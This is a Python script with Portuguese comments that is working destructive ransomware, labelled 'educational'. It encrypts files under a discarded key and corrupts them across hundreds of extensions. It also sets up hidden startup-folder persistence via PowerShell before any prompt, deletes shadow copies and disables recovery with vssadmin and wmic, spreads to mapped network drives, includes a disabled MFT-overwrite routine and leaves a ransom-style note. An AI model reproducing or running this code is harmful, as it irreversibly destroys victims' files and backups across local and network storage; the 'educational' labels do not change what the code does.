from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from cryptography.fernet import Fernet
import os
import hashlib
import struct
import subprocess
import platform
import sys
import shutil

EXT_FINAL = ".debido"

# LISTA COMPLETA DE EXTENSÕES DE ARQUIVOS
EXTENSOES_ALVO = {
    # Documentos de texto
    '.txt', '.doc', '.docx', '.docm', '.dot', '.dotx', '.dotm', '.odt', '.ott', '.rtf', '.wpd',
    
    # Planilhas
    '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlt', '.xltx', '.xltm', '.ods', '.ots', '.csv',
    
    # Apresentações
    '.ppt', '.pptx', '.pptm', '.pot', '.potx', '.potm', '.pps', '.ppsx', '.ppsm', '.odp', '.otp',
    
    # PDF e eBooks
    '.pdf', '.epub', '.mobi', '.azw', '.azw3', '.ibooks',
    
    # Imagens
    '.jpg', '.jpeg', '.jpe', '.jif', '.jfif', '.jfi', '.png', '.gif', '.bmp', '.tiff', '.tif',
    '.raw', '.cr2', '.nef', '.arw', '.svg', '.ai', '.eps', '.psd', '.xcf', '.indd', '.cdr',
    '.webp', '.heic', '.ico', '.ico', '.icns',
    
    # Vídeos
    '.mp4', '.avi', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.mpg', '.mpeg', '.3gp', '.mkv',
    '.vob', '.ogv', '.qt', '.rm', '.rmvb', '.asf', '.m2ts', '.mts', '.ts', '.f4v',
    
    # Áudio
    '.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.aiff', '.ape', '.opus', '.amr',
    '.mid', '.midi', '.kar', '.ra', '.rmi',
    
    # Arquivos compactados
    '.zip', '.rar', '.7z', '.tar', '.gz', '.gzip', '.bz2', '.xz', '.lz', '.lzma', '.cab',
    '.iso', '.dmg', '.pkg', '.rpm', '.deb', '.msi', '.apk',
    
    # Bancos de dados
    '.sql', '.mdb', '.accdb', '.accde', '.accdt', '.accdr', '.dbf', '.db', '.sqlite', '.sqlite3',
    '.mdf', '.ndf', '.ldf', '.bak', '.backup', '.dbc', '.fp7', '.myd', '.myi',
    
    # Desenvolvimento e código
    '.py', '.pyc', '.pyo', '.pyw', '.pyz', '.java', '.class', '.jar', '.war', '.ear', '.js',
    '.jsx', '.ts', '.tsx', '.css', '.scss', '.sass', '.less', '.html', '.htm', '.xhtml', '.xml',
    '.json', '.yaml', '.yml', '.php', '.asp', '.aspx', '.jsp', '.cs', '.cpp', '.c', '.h', '.hpp',
    '.vb', '.vbs', '.pl', '.pm', '.rb', '.go', '.rs', '.swift', '.kt', '.dart', '.scala',
    '.config', '.ini', '.inf', '.cfg', '.conf',
    
    # Scripts e executáveis
    '.bat', '.cmd', '.ps1', '.sh', '.bash', '.zsh', '.csh', '.tcsh', '.ksh', '.exe', '.dll',
    '.so', '.dylib', '.bin', '.app', '.com', '.scr', '.msi', '.pif',
    
    # Virtualização e containers
    '.vmx', '.vmdk', '.vdi', '.vhdx', '.vhd', '.ovf', '.ova', '.dockerfile', '.yml', '.yaml',
    
    # Backup e sincronização
    '.bak', '.backup', '.tmp', '.temp', '.old', '.new', '.part', '.partial', '.sync',
    
    # E-mail e mensagens
    '.pst', '.ost', '.eml', '.msg', '.vcf', '.ics',
    
    # Fontes
    '.ttf', '.otf', '.fon', '.fnt', '.woff', '.woff2',
    
    # CAD e design
    '.dwg', '.dxf', '.stl', '.obj', '.fbx', '.3ds', '.blend', '.max', '.mb', '.ma',
    
    # Jogos e saves
    '.sav', '.save', '.gam', '.minecraft', '.rgss3a', '.unity3d',
    
    # Outros documentos
    '.chm', '.hlp', '.lit', '.oxps', '.xps', '.pages', '.numbers', '.key',
    
    # Configurações e dados de aplicativos
    '.reg', '.dat', '.db', '.log', '.lst', '.m3u', '.m3u8', '.pls'
}

def educational_persistence_example():
    """Exemplo educacional de técnicas de persistência - APENAS PARA ESTUDO"""
    if platform.system().lower() != "windows":
        return
    
    try:
        # Obtém o caminho do arquivo atual (seja .exe ou .py)
        current_file = sys.argv[0]
        file_name = os.path.basename(current_file)
        
        # Define o caminho de destino no TEMP
        temp_dir = os.path.expandvars('%TEMP%')
        destination_path = os.path.join(temp_dir, file_name)
        
        # Se já estamos executando da pasta TEMP, não faz nada
        if os.path.abspath(current_file) == os.path.abspath(destination_path):
            print("Já em execução a partir do TEMP, evitando recopia.")
            return
        
        # Copia o arquivo para o TEMP
        shutil.copy2(current_file, destination_path)
        print(f"Cópia criada em: {destination_path}")
        
        # Cria um atalho na pasta de inicialização
        startup_dir = os.path.expandvars('%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        shortcut_path = os.path.join(startup_dir, "Windows_System_Utility.lnk")
        
        # Cria o atalho usando PowerShell
        ps_script = f"""
        $WshShell = New-Object -comObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
        $Shortcut.TargetPath = "{destination_path}"
        $Shortcut.WorkingDirectory = "{temp_dir}"
        $Shortcut.WindowStyle = 7
        $Shortcut.Save()
        """
        
        # Executa o PowerShell para criar o atalho
        result = subprocess.run([
            "powershell", "-WindowStyle", "Hidden", "-Command", ps_script
        ], capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            print(f"Atalho de inicialização criado: {shortcut_path}")
        else:
            print(f"Erro ao criar atalho: {result.stderr}")
            
    except Exception as e:
        print(f"Erro na persistência educacional: {e}")

def corrupt_data(data: bytes) -> bytes:
    """Corrompe permanentemente os dados de forma irreversível"""
    if len(data) < 100:
        return get_random_bytes(len(data))
    
    data_array = bytearray(data)
    
    for i in range(min(100, len(data_array))):
        data_array[i] = (data_array[i] + 73) % 256
    
    mid_point = len(data_array) // 2
    for i in range(mid_point, min(mid_point + 50, len(data_array))):
        data_array[i] = data_array[i] ^ 0xFF
    
    for i in range(max(0, len(data_array) - 100), len(data_array)):
        data_array[i] = (data_array[i] * 7) % 256
    
    for _ in range(min(1000, len(data_array) // 10)):
        pos = os.urandom(4)
        pos = struct.unpack('I', pos)[0] % len(data_array)
        data_array[pos] = os.urandom(1)[0]
    
    return bytes(data_array)

def encrypt_and_corrupt(data: bytes) -> bytes:
    key = get_random_bytes(32)
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_GCM, iv)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    encrypted_data = iv + tag + ciphertext
    
    return corrupt_data(encrypted_data)

def destroy_file_5x(path: str):
    print(f"Destruindo: {path}")
    
    with open(path, "rb") as f:
        original_data = f.read()
    
    current_data = original_data
    for cycle in range(5):
        current_data = encrypt_and_corrupt(current_data)
        if cycle < 4:
            current_data = corrupt_data(current_data)
    
    with open(path, "wb") as f:
        f.write(current_data)
        f.flush()
        os.fsync(f.fileno())
    
    file_size = os.path.getsize(path)
    novo_nome = path + EXT_FINAL
    os.rename(path, novo_nome)
    
    print(f"✅ Arquivo destruído: {novo_nome} ({(file_size / 1024):.2f} KB corrompidos)")

def secure_file_destruction(path: str):
    """Destruição segura para arquivos sensíveis"""
    try:
        file_size = os.path.getsize(path)
        
        patterns = [
            b'\x00' * file_size,
            b'\xFF' * file_size,
            get_random_bytes(file_size),
            b'\x55' * file_size,
            b'\xAA' * file_size,
        ]
        
        for pattern in patterns:
            with open(path, "wb") as f:
                f.write(pattern)
                f.flush()
                os.fsync(f.fileno())
    except Exception as e:
        print(f"Erro na destruição segura de {path}: {e}")

def delete_shadow_copies():
    """Tenta excluir as shadow copies do Windows (Volume Shadow Copy Service)"""
    if platform.system().lower() == "windows":
        try:
            subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], check=True)
            print("✅ Shadow copies excluídas.")
        except subprocess.CalledProcessError as e:
            print(f"❌ Erro ao excluir shadow copies: {e}")

def destroy_mft():
    """Tenta corromper o MFT (Master File Table) do NTFS - apenas para Windows"""
    if platform.system().lower() == "windows":
        try:
            drives = ["C:", "D:", "E:", "F:"]
            for drive in drives:
                mft_path = fr"{drive}\$MFT"
                if os.path.exists(mft_path):
                    with open(mft_path, "wb") as f:
                        f.write(get_random_bytes(1024 * 1024))
                    print(f"✅ MFT corrompido em {drive}")
        except Exception as e:
            print(f"❌ Erro ao corromper MFT: {e}")

def disable_system_recovery():
    """Desativa a Restauração do Sistema no Windows"""
    if platform.system().lower() == "windows":
        try:
            subprocess.run(["wmic", "shadowcopy", "delete"], check=True)
            subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], check=True)
            subprocess.run(["wmic", "recoveros", "set", "recoveryenabled=false"], check=True)
            print("✅ Restauração do sistema desativada.")
        except subprocess.CalledProcessError as e:
            print(f"❌ Erro ao desativar restauração do sistema: {e}")

def propagate_to_network_shares():
    """Tenta se propagar para unidades de rede"""
    network_shares = ["Z:", "Y:", "X:", "W:", "V:", "U:"]
    for share in network_shares:
        if os.path.exists(share):
            try:
                original_dir = os.getcwd()
                os.chdir(share)
                percorrer_diretorio_destruir()
                os.chdir(original_dir)
            except Exception as e:
                print(f"❌ Erro ao propagar para {share}: {e}")

def percorrer_diretorio_destruir(directory="."):
    """Percorre diretório destruindo arquivos com as extensões alvo"""
    
    try:
        arquivos = os.listdir(directory)
    except PermissionError:
        print(f"❌ Permissão negada para acessar: {directory}")
        return
    except FileNotFoundError:
        print(f"❌ Diretório não encontrado: {directory}")
        return
    
    for arq in arquivos:
        full_path = os.path.join(directory, arq)
        try:
            if os.path.isfile(full_path):
                ext = os.path.splitext(arq)[1].lower()
                if ext in EXTENSOES_ALVO and not arq.endswith(EXT_FINAL):
                    try:
                        destroy_file_5x(full_path)
                        
                        # Destruição extra para arquivos particularmente sensíveis
                        if ext in {'.doc', '.docx', '.pdf', '.xls', '.xlsx', '.sql', '.mdb', '.accdb'}:
                            novo_caminho = full_path + EXT_FINAL
                            if os.path.exists(novo_caminho):
                                secure_file_destruction(novo_caminho)
                                
                    except Exception as e:
                        print(f"❌ Erro ao destruir {full_path}: {str(e)}")
            elif os.path.isdir(full_path):
                # Evita diretórios do sistema
                dir_name = os.path.basename(full_path)
                diretorios_proibidos = {
                    'Windows', 'System32', 'System64', 'SysWOW64', '$Recycle.Bin',
                    'Program Files', 'Program Files (x86)', 'ProgramData', 'Boot',
                    'Recovery', 'System Volume Information', 'PerfLogs'
                }
                
                if dir_name not in diretorios_proibidos and not dir_name.startswith('$'):
                    try:
                        percorrer_diretorio_destruir(full_path)
                    except Exception as e:
                        print(f"❌ Erro ao acessar diretório {full_path}: {e}")
        except Exception as e:
            print(f"❌ Erro ao processar {full_path}: {e}")

def criar_aviso_resgate():
    """Cria arquivo de aviso sobre a destruição"""
    aviso = f"""
    ⚠️  SEUS ARQUIVOS FORAM DESTRUÍDOS ⚠️
    
    Todos os seus arquivos foram criptografados e CORROMPIDOS permanentemente.
    
    EXTENSÕES AFETADAS ({len(EXTENSOES_ALVO)} tipos de arquivo):
    {', '.join(sorted(EXTENSOES_ALVO))}
    
    A recuperação é IMPOSSÍVEL devido à corrupção intencional dos dados.
    
    Este é um exemplo educativo de como o ransomware pode ser destrutivo.
    
    ------------------------------------
    ATENÇÃO: Este é apenas um exemplo!
    Não use este código para atividades maliciosas.
    
    Arquivos destruídos: {len(EXTENSOES_ALVO)} tipos diferentes
    Extensão final: {EXT_FINAL}
    """
    
    with open("LEIA_ISSO.txt", "w", encoding="utf-8") as f:
        f.write(aviso)
    print("📄 Arquivo de aviso criado: LEIA_ISSO.txt")

def mostrar_estatisticas():
    """Mostra estatísticas das extensões alvo"""
    categorias = {}
    for ext in EXTENSOES_ALVO:
        categoria = "Outros"
        if ext in ['.doc', '.docx', '.pdf', '.txt', '.rtf']:
            categoria = "Documentos"
        elif ext in ['.xls', '.xlsx', '.csv']:
            categoria = "Planilhas"
        elif ext in ['.jpg', '.png', '.gif', '.bmp']:
            categoria = "Imagens"
        elif ext in ['.mp4', '.avi', '.mov']:
            categoria = "Vídeos"
        elif ext in ['.mp3', '.wav', '.flac']:
            categoria = "Áudio"
        elif ext in ['.zip', '.rar', '.7z']:
            categoria = "Compactados"
        elif ext in ['.py', '.java', '.js', '.html']:
            categoria = "Código"
        elif ext in ['.exe', '.dll', '.msi']:
            categoria = "Executáveis"
        elif ext in ['.sql', '.mdb', '.accdb']:
            categoria = "Bancos de Dados"
        
        if categoria not in categorias:
            categorias[categoria] = []
        categorias[categoria].append(ext)
    
    print("\n📊 ESTATÍSTICAS DE EXTENSÕES ALVO:")
    for categoria, exts in categorias.items():
        print(f"   {categoria}: {len(exts)} tipos")

if __name__ == "__main__":
    print("🔓 Iniciando processo de destruição de arquivos...")
    print("⚠️  ESTE PROCESSO É IRREVERSÍVEL!")
    
    # Mostra estatísticas
    mostrar_estatisticas()
    print(f"📁 Total de extensões alvo: {len(EXTENSOES_ALVO)}")
    
    # Executa a persistência primeiro
    if platform.system().lower() == "windows":
        educational_persistence_example()
    
    resposta = input("Continuar? (s/N): ")
    if resposta.lower() != 's':
        print("Operação cancelada.")
        exit()
    
    # Fase 1: Destruir arquivos locais
    percorrer_diretorio_destruir()
    
    # Fase 2: Medidas anti-recuperação (Windows)
    if platform.system().lower() == "windows":
        delete_shadow_copies()
        disable_system_recovery()
        # destroy_mft()  # CUIDADO: Extremamente perigoso
    
    # Fase 3: Propagação para redes
    propagate_to_network_shares()
    
    criar_aviso_resgate()
    
    print("🎯 Processo de destruição concluído!")
    print(f"💀 {len(EXTENSOES_ALVO)} tipos de arquivo foram alvo de destruição.")
